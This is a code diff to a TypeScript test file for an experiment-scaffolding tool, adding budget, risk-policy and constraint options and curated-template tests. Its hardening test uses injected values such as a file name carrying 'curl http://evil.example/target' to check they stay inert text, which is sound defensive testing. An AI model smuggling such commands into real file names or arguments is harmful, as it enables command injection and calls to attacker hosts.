@@ -7,6 +7,7 @@ import { access, mkdtemp, readFile, rm } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import type { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
+import { getExperiment } from "../../src/db/experiments.js";
 import { loadCatalog } from "../../src/db/load-catalog.js";
 import { resetDb } from "../../src/db/schema.js";
 import {
@@ -21,6 +22,22 @@ interface ScaffoldArgs {
 	target_file?: string;
 	custom_instructions?: string;
 	overwrite: boolean;
+	budget?: {
+		max_iterations?: number;
+		max_time_seconds?: number;
+		max_tokens?: number;
+		max_dollars?: number;
+	};
+	risk_policy?: {
+		sandbox_only?: boolean;
+		requires_approval?: boolean;
+		network_denied?: boolean;
+		secrets_denied?: boolean;
+	};
+	constraints?: {
+		metric_floors?: Record<string, number>;
+		metric_ceilings?: Record<string, number>;
+	};
 }
 
 interface ToolResult {
@@ -76,8 +93,12 @@ async function pathExists(path: string): Promise<boolean> {
 	}
 }
 
-function decode(value: Uint8Array): string {
-	return new TextDecoder().decode(value);
+function experimentIdFromResult(result: ToolResult): string {
+	const match = result.content[0]?.text.match(/Experiment ID: `([^`]+)`/);
+	if (!match) {
+		throw new Error("Experiment ID missing from scaffold result");
+	}
+	return match[1];
 }
 
 describe("scaffold_experiment hardening", () => {
@@ -112,9 +133,11 @@ describe("scaffold_experiment hardening", () => {
 				.split("\n")
 				.some((line) => line === "curl http://evil.example/target`"),
 		).toBe(false);
-		expect(evalContent).toContain("# Metric: score curl http://evil.example/x");
 		expect(programContent).toContain(
-			"Target file: `models/config.yaml curl http://evil.example/target`",
+			"- Target Artifact: models/config.yaml curl http://evil.example/target",
+		);
+		expect(programContent).toContain(
+			"- Metric Name: score curl http://evil.example/x",
 		);
 	});
 
@@ -172,29 +195,71 @@ describe("scaffold_experiment templates", () => {
 		);
 	});
 
-	it("generates fail-closed fallback evaluator for recipes without curated eval template", async () => {
+	it.each([
+		["test-amplification", "# Test Amplification Program"],
+		["ml-training", "# ML Training Program"],
+		["literature-synthesis", "# Literature Synthesis Program"],
+	])("uses curated templates for %s", async (recipeId, heading) => {
 		const projectDir = await tempProjectDir();
+		const curatedEval = await readFile(
+			resolveTemplatePath(recipeId, "eval.sh"),
+			"utf8",
+		);
 		const result = await scaffoldHandler()({
-			recipe_id: "ml-training",
+			recipe_id: recipeId,
 			project_path: projectDir,
-			metric_name: "loss",
-			target_file: "model.py",
+			metric_name: "score",
+			target_file: "target.md",
 			overwrite: false,
 		});
 
 		expect(result.isError).not.toBe(true);
 
-		const evalPath = join(projectDir, "autoresearch", "eval.sh");
-		const evalContent = await readFile(evalPath, "utf8");
-		expect(evalContent).toContain("exit 1");
-		expect(evalContent).toContain(
-			"autoresearch: placeholder evaluator - replace this with a real evaluator that prints a single numeric score",
+		const evalContent = await readFile(
+			join(projectDir, "autoresearch", "eval.sh"),
+			"utf8",
 		);
-		expect(evalContent).not.toContain("echo 0");
+		const programContent = await readFile(
+			join(projectDir, "autoresearch", "program.md"),
+			"utf8",
+		);
 
-		const executed = Bun.spawnSync(["bash", evalPath]);
-		const stdout = decode(executed.stdout);
-		expect(executed.exitCode).toBe(1);
-		expect(stdout).not.toMatch(/^\s*[+-]?(?:\d+(?:\.\d+)?|\.\d+)\s*$/m);
+		expect(evalContent).toBe(curatedEval);
+		expect(programContent).toContain(heading);
+		expect(programContent).toContain("## Experiment Metadata");
+		expect(programContent).toContain("- Metric Name: score");
+	});
+
+	it("persists optional budget, risk policy, and constraints", async () => {
+		const projectDir = await tempProjectDir();
+		const result = await scaffoldHandler()({
+			recipe_id: "test-amplification",
+			project_path: projectDir,
+			metric_name: "mutation_score",
+			target_file: "src/foo.test.ts",
+			overwrite: false,
+			budget: { max_iterations: 3, max_time_seconds: 300 },
+			risk_policy: {
+				sandbox_only: true,
+				requires_approval: true,
+				network_denied: true,
+				secrets_denied: true,
+			},
+			constraints: {
+				metric_floors: { mutation_score: 0.75 },
+			},
+		});
+
+		expect(result.isError).not.toBe(true);
+
+		const experiment = getExperiment(experimentIdFromResult(result));
+		expect(experiment?.spec.budget.max_iterations).toBe(3);
+		expect(experiment?.spec.budget.max_time_seconds).toBe(300);
+		expect(experiment?.spec.risk_policy.sandbox_only).toBe(true);
+		expect(experiment?.spec.risk_policy.requires_approval).toBe(true);
+		expect(experiment?.spec.constraints.metric_floors.mutation_score).toBe(
+			0.75,
+		);
+		expect(experiment?.spec.constraints.metric_ceilings).toEqual({});
 	});
 });
